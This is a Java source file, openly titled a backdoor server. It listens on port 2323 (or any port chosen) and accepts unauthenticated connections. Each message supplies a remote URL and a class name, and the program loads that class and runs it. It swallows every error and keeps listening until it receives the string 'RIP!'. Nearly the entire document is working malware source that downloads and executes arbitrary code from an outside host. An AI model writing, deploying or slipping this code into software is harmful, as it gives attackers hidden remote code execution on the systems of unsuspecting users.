//Java Backdoor Server v1.0
// First let's import all the classes needed
import	java.io.InputStream ;
import	java.net.Socket ;
import	java.net.ServerSocket ;
import	java.net.URL ;
import	java.net.URLClassLoader ;

// The BackDoorServer implements Runnable, which means it will be run in a Thread
public class BackDoorServer implements Runnable {

	// The port the server will listen and a variable where the inputs will be stored
	int srvPort ;
	int inputChar ;

	// The ServerSocket and the Socket that will do the communication
	ServerSocket serverDoor ;
	Socket commSocket ;

	// The dafault constructor will build a Server on port 2323
	public BackDoorServer()
	{
		this(2323) ;
	}

	// Use this contructor if you want to run the server on a different port
	public BackDoorServer(int port)
	{
		srvPort	= port ;
		
		// Make the server run in a Thread
		Thread	theDoor  = new Thread(this) ;
		
		// Starts the Thread and invokes the method run()
		theDoor.start() ;
	}

	// Let it all begin!
	public void run()
	{
		try {
		// Initialize a server on the Port set by the contructor
		serverDoor  = new ServerSocket( srvPort ) ;

		// Listen till the client kills you!
		boolean	alive = true ;
		while(alive) {
			// Build the communication socket
			// This method will BLOCK until a client connects to the server!
			// That is why we need a Thread
			commSocket = serverDoor.accept() ;

			// Get an InputStream to read from the Socket
			InputStream in	= commSocket.getInputStream() ;
			
			// Build a StringBuffer to store the input
			// By default we assume the input to be no longer than 128 bytes
			StringBuffer line  = new StringBuffer(128) ;

			// Now read the input from the client and store it in the StringBuffer
			while((inputChar = in.read()) != -1 )
			{
				line.append( "" + (char) inputChar ) ;
			}
			
			// Convert the StringBuffer into a String
			String	lines = line.toString() ;
		
			// What was the input?
			if(lines.equals("RIP!"))
			{
				// Oh NO! The client killed me :( Shut down the BackDoorServer
				alive	= false ;
			} else {
				// Hey! The client told me to load a "PlugIn" Let's try it !
				try
				{
					// See the client documentation for the format  of the commands
					// The next 3 lines seperate the PlugIn location from PlugInName
					int	seperator = lines.indexOf("*") ;
					String	plugInLoc = lines.substring(0, seperator) ;
					String	plugInName = lines.substring(seperator + 1, lines.length()) ;

					// Where in the whole wide world do we find our PlugIn ?
					URL[] urlsToLoadFrom = new URL[]
					{
						new URL(plugInLoc)
					}  ;
			
					// From whereever, we will get it using a ClassLoader
					URLClassLoader plugInLoader	= new URLClassLoader(urlsToLoadFrom) ;

					// Now get the Class the Client told you to get !
					Class plugIn = Class.forName(plugInName, true, plugInLoader) ;

					// Make the PlugIn run in a Thread ( see "What is an interface?" )
					Thread plugInT	= new Thread((Runnable)plugIn.newInstance()) ;
					// RUN IT!	
					plugInT.run() ;

					// We don' need that anymore ...
					plugInName	= null ;
					plugInLoc	= null ;
				} catch(Throwable t) {
					
					//An error occured ! .. SHIT! but, nevertheless .. lets ignore it!
					// just go on and listen for another try !
				}
			}
			
			// OK! the PlugIn is running .. so go on and listen for another one
			in.close() ;
			line = null ;
			lines = null ;
		}		
		// Oh no .. we are dead ... so close the Sockets
		serverDoor.close() ;
		commSocket.close() ;
	
	} catch ( Throwable t ) {
		// Any error occured ! .. SHIT! 
		// but, nevertheless .. lets ignore it again ! :)
	}
}
}